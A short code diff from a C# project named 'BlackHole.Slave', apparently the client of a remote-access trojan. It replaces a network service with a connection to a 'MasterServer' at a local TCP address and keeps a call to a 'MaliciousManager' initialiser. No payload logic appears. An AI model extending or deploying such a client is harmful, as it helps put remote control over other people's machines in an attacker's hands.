@@ -8,16 +8,18 @@ namespace BlackHole.Slave
 {
     public class Program
     {
+        public static void FireShutdown(int reason) => MasterServer.Instance.FireShutdown(reason);
+
         public static void Main(string[] args)
         {
             try
             {
                 MaliciousManager.Instance.Initialize();
-                NetworkService.Instance.Initialize();
+                MasterServer.Instance.Connect("tcp://127.0.0.1:5556");
 
                 Kernel32.SetConsoleCtrlHandler(ctrl =>
                 {
-                    NetworkService.Instance.FireShutdown((int)ctrl);
+                    FireShutdown((int)ctrl);
                     Thread.Sleep(500);
                     return true;
                 }, true);
